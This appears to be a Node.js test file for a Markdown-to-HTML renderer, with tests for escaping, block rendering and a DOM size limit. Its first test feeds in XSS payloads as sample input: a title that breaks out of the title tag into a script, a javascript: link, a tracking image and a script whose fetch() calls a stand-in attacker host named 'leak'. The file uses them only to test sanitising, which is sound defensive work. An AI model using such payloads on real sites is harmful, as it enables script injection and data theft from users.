import assert from "node:assert/strict";
import test from "node:test";

import { ContentLimitError, renderMarkdownToHtml } from "../src/markdown.js";

test("raw HTML and scriptable link schemes are rendered as text", () => {
  const html = renderMarkdownToHtml({
    title: `Отчёт </title><script>alert(1)</script>`,
    markdown: [
      `# Привет <img src="https://attacker.invalid/pixel">`,
      "",
      `[safe](https://example.com/a?q=1&x=2)`,
      `[mail](mailto:team@example.com)`,
      `[unsafe](javascript:alert(1))`,
      "",
      `<script>fetch("https://attacker.invalid/leak")</script>`,
    ].join("\n"),
  });

  assert.doesNotMatch(html, /<script|<img/i);
  assert.match(html, /&lt;script&gt;/);
  assert.match(html, /href="https:\/\/example\.com\/a\?q=1&amp;x=2"/);
  assert.match(html, /href="mailto:team@example\.com"/);
  assert.doesNotMatch(html, /href="javascript:/i);
  assert.match(html, /Content-Security-Policy/);
});

test("renders the supported Markdown blocks into self-contained A4 HTML", () => {
  const html = renderMarkdownToHtml({
    title: "План выпуска",
    markdown: [
      "## Этапы",
      "",
      "- Анализ",
      "- Выпуск",
      "",
      "1. Первый",
      "2. Второй",
      "",
      "```js",
      "console.log('<safe>')",
      "```",
      "",
      "| Имя | Статус |",
      "| --- | ---: |",
      "| API | Готово |",
    ].join("\n"),
  });

  assert.match(html, /<h2>Этапы<\/h2>/);
  assert.match(html, /<ul><li>Анализ<\/li><li>Выпуск<\/li><\/ul>/);
  assert.match(html, /<ol><li>Первый<\/li><li>Второй<\/li><\/ol>/);
  assert.match(html, /<pre><code class="language-js">/);
  assert.match(html, /console\.log\(&#39;&lt;safe&gt;&#39;\)/);
  assert.match(html, /<table>/);
  assert.match(html, /@page\s*\{\s*size:\s*A4/);
  assert.doesNotMatch(html, /https?:\/\/(?:fonts|cdn)\./);
});

test("rejects documents that would exceed the DOM node budget", () => {
  const markdown = Array.from(
    { length: 10_001 },
    (_, index) => `- ${index}`,
  ).join("\n");
  assert.throws(
    () => renderMarkdownToHtml({ title: "Too large", markdown }),
    ContentLimitError,
  );
});
